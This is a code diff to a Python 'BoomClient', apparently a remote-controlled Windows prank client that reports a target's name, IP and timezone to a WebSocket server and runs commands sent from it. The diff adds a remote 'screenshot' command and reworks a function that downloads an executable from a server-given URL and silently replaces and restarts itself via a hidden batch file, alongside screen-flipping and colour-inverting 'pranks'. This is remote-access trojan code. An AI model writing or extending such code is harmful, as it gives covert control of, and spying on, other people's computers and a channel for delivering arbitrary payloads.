@@ -520,7 +520,9 @@ class BoomClient:
             "timezone": client_info["timezone"],
             "ip": client_info["ip"]
         }))
-        self.root.after(10000, self.send_heartbeat)
+        if self._heartbeat_after:
+            self.root.after_cancel(self._heartbeat_after)
+        self._heartbeat_after = self.root.after(10000, self.send_heartbeat)
         self.root.after(0, self.update_debug, f"Stage: {self.stage}\nConnected\nID: {self.client_id}\nName: {self.target_name}")
 
     def send_heartbeat(self):
@@ -534,7 +536,7 @@ class BoomClient:
                 }))
         except Exception:
             pass
-        self.root.after(10000, self.send_heartbeat)
+        self._heartbeat_after = self.root.after(10000, self.send_heartbeat)
 
     def on_ws_message(self, ws, message):
         try:
@@ -580,6 +582,9 @@ class BoomClient:
                     self.root.after(0, self.prank_update, url)
                 else:
                     self.root.after(0, self.execute_command, command)
+            elif msg_type == "ping":
+                if self.ws:
+                    self.ws.send(json.dumps({"type": "pong"}))
             elif msg_type == "welcome":
                 print(f"Welcome: {data.get('message')}")
         except Exception as e:
@@ -674,7 +679,6 @@ class BoomClient:
         if hasattr(self, '_avalanche_particles'):
             self._avalanche_particles = []
         if self.screen_flipped:
-            self.screen_flipped = False
             self.prank_flip_screen()
         if hasattr(self, '_negative_active') and self._negative_active:
             self.prank_negative()
@@ -769,7 +773,7 @@ class BoomClient:
             while i < 101 and not self.stop_flag:
                 step = random.randint(1, 2)
                 i += step
-                self.progress_var.set(f"{min(i, 100)}% complete")
+                self.root.after(0, lambda v=f"{min(i, 100)}% complete": self.progress_var.set(v))
                 time.sleep(0.15)
         threading.Thread(target=update_progress, daemon=True).start()
 
@@ -812,7 +816,7 @@ class BoomClient:
                 h = remaining // 3600
                 m = (remaining % 3600) // 60
                 s = remaining % 60
-                countdown_var.set(f"Time remaining: {h:02d}:{m:02d}:{s:02d}")
+                self.root.after(0, lambda v=f"Time remaining: {h:02d}:{m:02d}:{s:02d}": countdown_var.set(v))
                 time.sleep(1)
         threading.Thread(target=do_countdown, daemon=True).start()
 
@@ -887,8 +891,18 @@ class BoomClient:
         try:
             device = win32api.EnumDisplayDevices(None, 0)
             dm = win32api.EnumDisplaySettings(device.DeviceName, -1)
-            dm.DisplayOrientation = (dm.DisplayOrientation + 1) % 4
-            dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
+            if not self.screen_flipped:
+                # Save original orientation and resolution on first flip
+                self._original_orientation = dm.DisplayOrientation
+                self._original_pels_width = dm.PelsWidth
+                self._original_pels_height = dm.PelsHeight
+                dm.DisplayOrientation = (dm.DisplayOrientation + 1) % 4
+                dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
+            else:
+                # Restore original orientation directly
+                dm.DisplayOrientation = self._original_orientation
+                dm.PelsWidth = self._original_pels_width
+                dm.PelsHeight = self._original_pels_height
             win32api.ChangeDisplaySettingsEx(device.DeviceName, dm, 0)
             self.screen_flipped = not self.screen_flipped
         except Exception as e:
@@ -923,7 +937,7 @@ class BoomClient:
             while not self.stop_flag:
                 percent += random.randint(-5, 10)
                 percent = max(0, min(percent, 99))
-                progress_var.set(f"{percent}%")
+                self.root.after(0, lambda v=f"{percent}%": progress_var.set(v))
                 time.sleep(0.3)
         threading.Thread(target=fake_progress, daemon=True).start()
 
@@ -1008,44 +1022,14 @@ class BoomClient:
         do_glitch()
 
     def prank_negative(self):
-        """Invert screen colors using Magnification API, fallback to SetDeviceGammaRamp (toggle on/off)."""
+        """Invert screen colors using SetDeviceGammaRamp (toggle on/off)."""
         self.root.after(0, self.update_debug, f"Stage: Extra\nNegative Mode")
         import ctypes
-        from ctypes import wintypes
 
         if not hasattr(self, '_negative_active'):
             self._negative_active = False
 
         if not self._negative_active:
-            # 方案1: Magnification API (Windows 8+)
-            try:
-                mag = ctypes.windll.magnification
-                mag.MagInitialize()
-
-                class MAGCOLOREFFECT(ctypes.Structure):
-                    _fields_ = [("transform", ctypes.c_float * 25)]
-
-                effect = MAGCOLOREFFECT()
-                # 颜色反转矩阵: RGB 取反, alpha 不变, 偏移+1 使结果落在 [0,1]
-                inv = [
-                    -1.0, 0.0, 0.0, 0.0, 0.0,
-                    0.0, -1.0, 0.0, 0.0, 0.0,
-                    0.0, 0.0, -1.0, 0.0, 0.0,
-                    0.0, 0.0, 0.0, 1.0, 0.0,
-                    1.0, 1.0, 1.0, 0.0, 1.0
-                ]
-                for i in range(25):
-                    effect.transform[i] = inv[i]
-
-                if mag.MagSetFullscreenColorEffect(ctypes.byref(effect)):
-                    self._negative_active = True
-                    self._negative_method = 'magnification'
-                    return
-                mag.MagUninitialize()
-            except Exception:
-                pass
-
-            # 方案2: SetDeviceGammaRamp (回退)
             try:
                 class GAMMA_RAMP(ctypes.Structure):
                     _fields_ = [("red", ctypes.c_ushort * 256),
@@ -1061,47 +1045,24 @@ class BoomClient:
                 ctypes.windll.user32.ReleaseDC(0, hdc)
                 if ok:
                     self._negative_active = True
-                    self._negative_method = 'gamma'
             except Exception:
                 pass
         else:
-            # 恢复
-            method = getattr(self, '_negative_method', '')
-            if method == 'magnification':
-                try:
-                    mag = ctypes.windll.magnification
-                    class MAGCOLOREFFECT(ctypes.Structure):
-                        _fields_ = [("transform", ctypes.c_float * 25)]
-                    effect = MAGCOLOREFFECT()
-                    identity = [
-                        1.0, 0.0, 0.0, 0.0, 0.0,
-                        0.0, 1.0, 0.0, 0.0, 0.0,
-                        0.0, 0.0, 1.0, 0.0, 0.0,
-                        0.0, 0.0, 0.0, 1.0, 0.0,
-                        0.0, 0.0, 0.0, 0.0, 1.0
-                    ]
-                    for i in range(25):
-                        effect.transform[i] = identity[i]
-                    mag.MagSetFullscreenColorEffect(ctypes.byref(effect))
-                    mag.MagUninitialize()
-                except Exception:
-                    pass
-            elif method == 'gamma':
-                try:
-                    class GAMMA_RAMP(ctypes.Structure):
-                        _fields_ = [("red", ctypes.c_ushort * 256),
-                                    ("green", ctypes.c_ushort * 256),
-                                    ("blue", ctypes.c_ushort * 256)]
-                    ramp = GAMMA_RAMP()
-                    for i in range(256):
-                        ramp.red[i] = i * 257
-                        ramp.green[i] = i * 257
-                        ramp.blue[i] = i * 257
-                    hdc = ctypes.windll.user32.GetDC(0)
-                    ctypes.windll.gdi32.SetDeviceGammaRamp(hdc, ctypes.byref(ramp))
-                    ctypes.windll.user32.ReleaseDC(0, hdc)
-                except Exception:
-                    pass
+            try:
+                class GAMMA_RAMP(ctypes.Structure):
+                    _fields_ = [("red", ctypes.c_ushort * 256),
+                                ("green", ctypes.c_ushort * 256),
+                                ("blue", ctypes.c_ushort * 256)]
+                ramp = GAMMA_RAMP()
+                for i in range(256):
+                    ramp.red[i] = i * 257
+                    ramp.green[i] = i * 257
+                    ramp.blue[i] = i * 257
+                hdc = ctypes.windll.user32.GetDC(0)
+                ctypes.windll.gdi32.SetDeviceGammaRamp(hdc, ctypes.byref(ramp))
+                ctypes.windll.user32.ReleaseDC(0, hdc)
+            except Exception:
+                pass
             self._negative_active = False
 
     def prank_infinite_window(self):
@@ -1198,6 +1159,7 @@ class BoomClient:
             "prank_mirror_typing": self.prank_mirror_typing,
             "prank_window_exile": self.prank_window_exile,
             "prank_avalanche": self.prank_avalanche,
+            "screenshot": self.capture_screenshot,
             "exit": self.stop_prank,
         }
 
@@ -1407,69 +1369,82 @@ class BoomClient:
     # ------------------------------------------------------------------ #
     def prank_update(self, url):
         """Download update from URL and self-replace."""
+        import urllib.request
+        import tempfile
+        import subprocess
+
+        tmp_dir = tempfile.gettempdir()
+        tmp_exe = os.path.join(tmp_dir, "boom_update.exe")
+
+        self.root.after(0, self.update_debug, "Stage: Update\nDownloading...")
+
+        def download_progress(block_num, block_size, total_size):
+            if total_size > 0:
+                percent = min(100, int(block_num * block_size * 100 / total_size))
+                try:
+                    self.ws.send(json.dumps({"type": "update_progress", "stage": "downloading", "percent": percent}))
+                except Exception:
+                    pass
+
+        def do_download():
+            try:
+                urllib.request.urlretrieve(url, tmp_exe, reporthook=download_progress)
+                self.root.after(0, self._after_download, tmp_exe)
+            except Exception as e:
+                try:
+                    self.ws.send(json.dumps({"type": "update_result", "success": False, "error": str(e)}))
+                except Exception:
+                    pass
+
+        threading.Thread(target=do_download, daemon=True).start()
+
+    def _after_download(self, tmp_exe):
+        """Verify downloaded file, create batch updater, and restart. Runs in main thread."""
+        import subprocess
+
         try:
-            import urllib.request
-            import tempfile
-            import subprocess
+            self.ws.send(json.dumps({"type": "update_progress", "stage": "verifying", "percent": 100}))
+        except Exception:
+            pass
 
-            tmp_dir = tempfile.gettempdir()
-            tmp_exe = os.path.join(tmp_dir, "boom_update.exe")
-
-            self.root.after(0, self.update_debug, "Stage: Update\nDownloading...")
-
-            def download_progress(block_num, block_size, total_size):
-                if total_size > 0:
-                    percent = min(100, int(block_num * block_size * 100 / total_size))
-                    try:
-                        self.ws.send(json.dumps({"type": "update_progress", "stage": "downloading", "percent": percent}))
-                    except Exception:
-                        pass
-
-            urllib.request.urlretrieve(url, tmp_exe, reporthook=download_progress)
-
-            try:
-                self.ws.send(json.dumps({"type": "update_progress", "stage": "verifying", "percent": 100}))
-            except Exception:
-                pass
-
-            if os.path.getsize(tmp_exe) < 1024:
-                self.ws.send(json.dumps({"type": "update_result", "success": False, "error": "Downloaded file too small"}))
+        if os.path.getsize(tmp_exe) < 51200:
+            self.ws.send(json.dumps({"type": "update_result", "success": False, "error": "Downloaded file too small"}))
+            return
+        with open(tmp_exe, 'rb') as f:
+            if f.read(2) != b'MZ':
+                self.ws.send(json.dumps({"type": "update_result", "success": False, "error": "Downloaded file is not a valid PE executable"}))
                 return
 
-            if not getattr(sys, 'frozen', False):
-                self.ws.send(json.dumps({"type": "update_result", "success": False, "error": "Not running as frozen EXE"}))
-                return
-            current_exe = sys.executable
+        if not getattr(sys, 'frozen', False):
+            self.ws.send(json.dumps({"type": "update_result", "success": False, "error": "Not running as frozen EXE"}))
+            return
+        current_exe = sys.executable
 
-            try:
-                self.ws.send(json.dumps({"type": "update_progress", "stage": "replacing", "percent": 100}))
-            except Exception:
-                pass
+        try:
+            self.ws.send(json.dumps({"type": "update_progress", "stage": "replacing", "percent": 100}))
+        except Exception:
+            pass
 
-            bat_path = os.path.join(tmp_dir, "boom_updater.bat")
-            with open(bat_path, "w") as f:
-                f.write('@echo off\n')
-                f.write('timeout /t 2 /nobreak >nul\n')
-                f.write(f'copy /y "{tmp_exe}" "{current_exe}"\n')
-                f.write(f'del /q "{tmp_exe}"\n')
-                f.write(f'start "" "{current_exe}" --background\n')
-                f.write('del /q "%~f0"\n')
+        tmp_dir = os.path.dirname(tmp_exe)
+        bat_path = os.path.join(tmp_dir, "boom_updater.bat")
+        with open(bat_path, "w") as f:
+            f.write('@echo off\n')
+            f.write('timeout /t 2 /nobreak >nul\n')
+            f.write(f'copy /y "{tmp_exe}" "{current_exe}"\n')
+            f.write(f'del /q "{tmp_exe}"\n')
+            f.write(f'start "" "{current_exe}" --background\n')
+            f.write('del /q "%~f0"\n')
 
-            try:
-                self.ws.send(json.dumps({"type": "update_progress", "stage": "restarting", "percent": 100}))
-            except Exception:
-                pass
+        try:
+            self.ws.send(json.dumps({"type": "update_progress", "stage": "restarting", "percent": 100}))
+        except Exception:
+            pass
 
-            self.ws.send(json.dumps({"type": "update_result", "success": True}))
+        self.ws.send(json.dumps({"type": "update_result", "success": True}))
 
-            subprocess.Popen(["cmd", "/c", bat_path], creationflags=0x08000000)
-            self.stop_prank()
-            os._exit(0)
-        except Exception as e:
-            try:
-                self.ws.send(json.dumps({"type": "update_result", "success": False, "error": str(e)}))
-            except Exception:
-                pass
+        subprocess.Popen(["cmd", "/c", bat_path], creationflags=0x08000000)
+        self.stop_prank()
+        os._exit(0)
 
     # ------------------------------------------------------------------ #
     #  6. Window exile – slowly push every window toward nearest screen edge
